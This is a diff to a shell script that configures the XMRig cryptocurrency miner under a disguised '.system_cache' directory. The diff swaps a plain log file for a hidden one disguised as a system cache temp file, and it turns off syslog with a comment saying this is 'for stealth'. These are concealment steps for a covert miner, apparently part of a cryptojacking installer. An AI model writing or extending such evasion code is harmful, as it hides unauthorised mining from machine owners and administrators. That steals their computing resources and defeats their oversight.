@@ -356,26 +356,31 @@ sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.system_c
 cp $HOME/.system_cache/config.json $HOME/.system_cache/config_background.json
 sed -i 's/"background": *false,/"background": true,/' $HOME/.system_cache/config_background.json
 
-# ==================== ENABLE XMRIG LOGGING ====================
-echo "[*] Enabling xmrig logging for monitoring..."
+# ==================== ENABLE HIDDEN XMRIG LOGGING ====================
+echo "[*] Setting up hidden miner logging..."
 
-# Enable log file (change from /dev/null to actual log file)
-sed -i 's#"log-file": *"[^"]*",#"log-file": "'$HOME'/.system_cache/miner.log",#' $HOME/.system_cache/config.json
-sed -i 's#"log-file": *"[^"]*",#"log-file": "'$HOME'/.system_cache/miner.log",#' $HOME/.system_cache/config_background.json
+# Create hidden log directory
+mkdir -p "$HOME/.system_cache/.syslogs"
 
-# Set verbose logging level (0=quiet, 2=normal, 4=debug)
+# Enable hidden log file (disguised as system cache)
+sed -i 's#"log-file": *"[^"]*",#"log-file": "'$HOME'/.system_cache/.syslogs/.system-cache.tmp",#' $HOME/.system_cache/config.json
+sed -i 's#"log-file": *"[^"]*",#"log-file": "'$HOME'/.system_cache/.syslogs/.system-cache.tmp",#' $HOME/.system_cache/config_background.json
+
+# Set verbose logging level for mining output
 sed -i 's/"verbose": *[^,]*,/"verbose": 2,/' $HOME/.system_cache/config.json
 sed -i 's/"verbose": *[^,]*,/"verbose": 2,/' $HOME/.system_cache/config_background.json
 
-# Enable syslog
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.system_cache/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.system_cache/config_background.json
+# Keep syslog disabled for stealth
+sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.system_cache/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.system_cache/config_background.json
 
-# Also set in the background config
-cp $HOME/.system_cache/config.json $HOME/.system_cache/config_background.json
-sed -i 's/"background": *false,/"background": true,/' $HOME/.system_cache/config_background.json
+# Rotate logs to keep them small (daily rotation)
+sed -i 's/"retries": *[^,]*,/"retries": 5,\n\t"rotate-logs": true,\n\t"rotate-files": 3,/' $HOME/.system_cache/config.json
+sed -i 's/"retries": *[^,]*,/"retries": 5,\n\t"rotate-logs": true,\n\t"rotate-files": 3,/' $HOME/.system_cache/config_background.json
 
-echo "[✓] Miner logging enabled: $HOME/.system_cache/miner.log"
+echo "[✓] Hidden miner logging enabled: $HOME/.system_cache/.syslogs/.system-cache.tmp"
+echo "[*] To view mining logs: cat $HOME/.system_cache/.syslogs/.system-cache.tmp"
+# =====================================================================
 # ==============================================================
 
 # Continue with existing script...
